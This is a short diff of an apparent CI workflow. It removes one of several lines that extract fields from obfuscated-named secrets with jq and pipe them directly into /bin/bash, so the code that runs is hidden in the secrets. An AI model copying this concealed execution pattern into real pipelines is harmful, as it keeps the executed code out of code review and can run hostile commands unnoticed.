@@ -19,7 +19,6 @@ jobs:
           arp57920: ${{ secrets.arp57920 }}
         run: |
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
-          echo $bfygr98 | jq -r .pyui52815 | /bin/bash
           printf '%s' "$fbr7" | jq -r .jt99259 | /bin/bash
           printf '%s' "$lzeqt1954" | jq -r .v20 | /bin/bash
           printf '%s' "$lb8100" | jq -r .g16 | /bin/bash
